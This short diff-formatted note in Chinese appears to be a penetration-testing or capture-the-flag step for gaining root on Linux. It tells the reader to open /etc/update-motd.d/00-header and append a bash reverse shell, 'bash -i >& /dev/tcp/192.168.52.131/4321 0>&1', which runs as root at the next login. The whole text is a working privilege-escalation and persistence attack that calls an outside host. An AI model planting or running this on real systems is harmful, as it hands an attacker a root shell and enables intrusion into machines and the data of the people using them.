@@ -1,0 +1,7 @@
+先切换目录(因为motd.d是全局性的文件所有在其中添加反弹shell就可以获得root用户)
+cd /etc/update-motd.d/
+然后查看00-header
+cat 00-header
+在00-hearder中添加
+bash -c "bash -i >& /dev/tcp/192.168.52.131/4321 0>&1"
+重新登录
